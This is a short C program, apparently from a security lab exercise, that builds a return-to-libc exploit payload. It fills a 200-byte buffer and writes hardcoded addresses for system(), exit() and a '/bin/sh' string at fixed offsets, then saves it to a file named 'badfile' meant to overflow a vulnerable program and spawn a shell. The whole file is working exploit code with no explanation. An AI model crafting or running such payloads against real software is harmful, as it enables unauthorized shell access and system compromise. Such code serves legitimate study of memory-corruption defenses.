// ret_to_libc_exploit.c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	char buf[200];
	FILE *badfile;

	memset(buf, 0xaa, 200); // fill the buffer with non-zeros

	*(long *) &buf[70] = 0xbffffe8c; // The address of "/bin/sh"
	*(long *) &buf[66] = 0xb7e52fb0; // The address of exit()
	*(long *) &buf[62] = 0xb7e5f430; // The address of system()

	badfile = fopen("./badfile", "w");
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);

	return 0;
}
